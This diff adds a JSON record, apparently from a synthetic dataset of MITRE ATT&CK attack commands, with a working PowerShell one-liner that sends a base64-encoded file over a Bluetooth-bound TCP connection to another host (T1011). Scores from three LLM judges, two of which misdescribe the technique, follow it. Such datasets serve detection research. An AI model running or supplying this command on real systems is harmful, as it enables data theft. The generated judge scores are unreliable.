@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
+  "explanation": "Encodes content and sends it over a custom TCP service bound to the Bluetooth interface, ensuring exfiltration flows over the Bluetooth medium (T1011).",
+  "rationale_steps": [
+    "Initiate the Bluetooth NAP connection.",
+    "Configure the Bluetooth NIC with a static address via netsh.",
+    "Bind the TCP socket to the Bluetooth IP to constrain medium.",
+    "Transmit base64 payload wrapped in innocuous markers over a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-7cae3b7b",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over Bluetooth (aligning with T1011 Exfiltration Over Other Network Medium), it doesn't perform data destruction as described in the technique description, showing a mismatch between the command and the claimed MITRE technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:14:58.015677Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses correct PowerShell and .NET syntax, and has balanced constructs throughout.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration by reading and sending a file's content over a Bluetooth-configured TCP connection, which is completely unrelated to the T1011 Data Destruction technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:15:00.127447Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell pipeline is well-formed with balanced quotes and parentheses, valid separators, and proper .NET method usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It connects to a Bluetooth PAN, configures and binds to the Bluetooth interface, base64-encodes a file, and exfiltrates over TCP as claimed, but setting a static IP via netsh generally requires admin rights despite 'None' privilege, which may cause failure.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T02:15:25.679058Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
